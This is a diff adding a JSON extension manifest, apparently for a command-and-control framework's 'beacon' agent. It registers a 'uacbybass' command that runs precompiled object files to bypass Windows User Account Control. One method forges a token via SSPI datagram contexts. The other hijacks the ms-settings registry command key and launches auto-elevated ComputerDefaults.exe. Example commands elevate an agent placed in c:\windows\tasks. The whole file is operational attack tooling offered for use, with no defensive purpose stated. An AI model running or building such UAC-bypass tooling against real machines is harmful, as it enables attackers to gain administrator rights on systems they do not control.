@@ -1,0 +1,34 @@
+{
+  "name": "UAC-BOF",
+  "description": "BOFs for UAC bypass",
+  "extensions": [
+    {
+      "type": "command",
+      "agents": ["beacon"],
+      "command": "uacbybass",
+      "description": "perform UAC bypass",
+      "message": "all credit to @icyguider, @x86matthew, and @splinter_code",
+      "subcommands":
+      [
+        {
+          "name": "sspi",
+          "description": "Forges a token from a fake network authentication though SSPI Datagram Contexts",
+          "example": "uacbybass sspi c:\\windows\\tasks\\agent.exe",
+          "args": [
+            "STRING <path>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/sspi.x64.o $PACK_BOF(CSTR {path})"
+        },
+        {
+          "name": "regshellcmd",
+          "description": "Modifies the \"ms-settings\\Shell\\Open\\command\" registry key and executes an auto-elevated EXE (ComputerDefaults.exe).",
+          "example": "uacbybass regshellcmd c:\\windows\\tasks\\agent.exe",
+          "args": [
+            "STRING <path>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/regshellcmd.x64.o $PACK_BOF(CSTR {path})"
+        }
+      ]
+    } 
+  ]
+}
